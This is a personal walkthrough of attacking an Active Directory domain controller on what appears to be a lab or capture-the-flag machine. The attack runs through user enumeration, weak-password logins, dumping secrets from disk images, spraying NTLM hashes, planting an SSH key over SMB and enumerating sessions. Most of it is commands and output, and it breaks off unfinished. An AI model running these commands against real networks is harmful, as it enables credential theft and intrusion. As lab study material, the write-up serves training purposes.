# Hostname setup
```python
sudo nxc smb 10.129.234.42 --generate-hosts-file /etc/hosts      
[sudo] password for kali: 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```
This has created me an entry in `/etc/hosts`

# Enuumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.234.42
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:13 +0000
Nmap scan report for 10.129.234.42
Host is up (0.014s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
50168/tcp open  unknown
50182/tcp open  unknown
50200/tcp open  unknown
50888/tcp open  unknown
51970/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds
```
Whats interesting here is that there is SSH (22) open
## Nmap
```python
nmap -p 22,53,88,135,139,445,464,593,3268,3269,3389,9389 -A --min-rate=2000 -sT AWSJPDC0522.shibuya.vl
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:17 +0000
Nmap scan report for AWSJPDC0522.shibuya.vl (10.129.234.42)
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-21 17:17:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-21T17:03:50
|_Not valid after:  2027-03-21T17:03:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-21T17:03:50
|_Not valid after:  2027-03-21T17:03:50
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-21T17:17:55+00:00
|_ssl-date: 2026-03-21T17:18:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-20T17:12:59
|_Not valid after:  2026-09-19T17:12:59
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Not a lot i can do with SSH until i get credentials

# SMB (445)
Null auth is enabled be default on domain controllers
Guest account is disabled

# Valid usernames found with kerbrute
```python
kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/21/26 - Ronnie Flathers @ropnop

2026/03/21 17:30:01 >  Using KDC(s):
2026/03/21 17:30:01 >  	AWSJPDC0522.shibuya.vl:88

2026/03/21 17:30:01 >  [+] VALID USERNAME:	 purple@shibuya.vl
2026/03/21 17:30:02 >  [+] VALID USERNAME:	 red@shibuya.vl
2026/03/21 17:30:14 >  [+] VALID USERNAME:	 Purple@shibuya.vl
2026/03/21 17:30:22 >  [+] VALID USERNAME:	 Red@shibuya.vl
2026/03/21 17:30:38 >  [+] VALID USERNAME:	 RED@shibuya.vl
2026/03/21 17:30:38 >  [+] VALID USERNAME:	 PURPLE@shibuya.vl
```
Found two users `red` and `purple` neither are asrep roastable

I can try their username as their password

```python
nxc rdp AWSJPDC0522.shibuya.vl -u red -p 'red' -k 
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\red:red
```
I have successful as `red`

```python
nxc rdp AWSJPDC0522.shibuya.vl -u purple -p 'purple' -k
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\purple:purple
```
Also successful auth as `purple`

# SMB access as `red`
## Shares
```python
nxc smb AWSJPDC0522.shibuya.vl -u red$ -p 'red' -k --shares
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Enumerated shares
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Share           Permissions     Remark
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -----           -----------     ------
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      C$                              Default share
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      images$                         
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      users           READ 
```
## Users
```python
nxc smb AWSJPDC0522.shibuya.vl -u red$ -p 'red' -k --users-export users.txt
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gillian.Douglas               2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Kelly.Davies                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Conor.Fletcher                2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Karl.Brown                    2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Tracey.Wood                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Mohamed.Brooks                2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Wendy.Stevenson               2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gerald.Allen                  2025-02-16 10:23:34 0 
```
I dumped the users there were 503 in total so i have not included them all in the output

Found what looks like a password in the user description

```python
svc_autojoin:K5&A6Dw9d8jrKWhV
```
Ill test these creds

# Compromising `svc_autojoin`

```python
nxc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV'  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV
```
Successful authentication

```python
nxc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' --shares               
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
```
This user has access to the `images$` share

```
smbclient \\\\AWSJPDC0522.shibuya.vl\\images$ -U 'svc_autojoin'%'K5&A6Dw9d8jrKWhV'                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 16 11:24:08 2025
  ..                                DHS        0  Wed Apr  9 01:09:45 2025
  AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 11:23:41 2025
  AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 11:23:45 2025
  AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 11:23:47 2025
  vss-meta.cab                        A   365686  Sun Feb 16 11:22:37 2025

		5048575 blocks of size 4096. 1565210 blocks available
smb: \> 
```
Found some .wim files which ill transfer to my machine

The second .wim file `AWSJPWK0222-02.wim` has SAM, SYTEM and SECURITY registry hives

```python
secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
[*] NL$KM 
 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
[*] Cleaning up...
```
Ive dumped the hashes of some users

The hash for the administrator does not work

The hash for the `operator` does not work

Ill put all these hashes into a file

# Spraying NTLM hashes
```python
nxc smb AWSJPDC0522.shibuya.vl -u users.txt -H 'hashes.txt' --continue-on-success

SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50
```
Found that the hash for the operator is the hash for `simon.watson`

```python
nxc smb AWSJPDC0522.shibuya.vl -u simon.watson -H '5d8c3d1a20bd63f60f469f6763ca0d50' --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
```
Since i only have a hash i cant SSH yet

But i can connect to the `users` share and add my public key to authorized_keys then SSH in

```python
smbclient \\\\AWSJPDC0522.shibuya.vl\\users -U 'simon.watson' --pw-nt-hash '5d8c3d1a20bd63f60f469f6763ca0d50' 
Try "help" to get a list of possible commands.
smb: \> cd simon.watson
smb: \simon.watson\> mkdir .ssh
smb: \simon.watson\> cd .ssh
smb: \simon.watson\.ssh\> put /home/kali/.ssh/id_ed25519.pub authorized_keys
putting file /home/kali/.ssh/id_ed25519.pub as \simon.watson\.ssh\authorized_keys (1.9 kB/s) (average 1.2 kB/s)
```
Now i should be able to SSH in 

# SSH access as `simon.watson`
```python
ssh simon.watson@shibuya.vl -i /home/kali/.ssh/id_ed25519 
The authenticity of host 'shibuya.vl (10.129.234.42)' can't be established.
ED25519 key fingerprint is: SHA256:SiXhmjQMScl7eQgH4/uyVXXTsCHM6diy6fh80l4zzJQ
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:22: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shibuya.vl' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>
```
I now have access via SSH

Ill upload sharphound

```python
scp -i /home/kali/.ssh/id_ed25519 SharpHound.exe simon.watson@shibuya.vl:/programdata/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
SharpHound.exe
```
This uploaded it to the target

```python
PS C:\Users\simon.watson\Desktop> C:\programdata\SharpHound.exe -c All
```
I have now got some data i can upload to bloodhound

```python

```
This copied the results back to my machine

Now i can put them into bloodhound

# Bloodhound
The `AWSJPDC0522.SHIBUYA.VL` machine account has two active sessions, one for simon which is probably my session over SSH and the other is for a user `nigel.mills`

To exploit this ill upload RunasCs to get the target session ID 

# Compromising `nigel.mills`
```python
scp -i /home/kali/.ssh/id_ed25519 RunasCs.exe simon.watson@shibuya.vl:/programdata/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
RunasCs.exe                                                                       100%   51KB 949.2KB/s   00:00
```
This uploaded it

```python
PS C:\Users\simon.watson\Desktop> C:\programdata\RunasCs.exe user pass qwinsta -l 9 

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 rdp-tcp#0         nigel.mills               1  Active
 console                                     2  Conn
 rdp-tcp                                 65536  Listen
PS C:\Users\simon.watson\Desktop>
```
Found `nigels` session ID `1`

```python

```


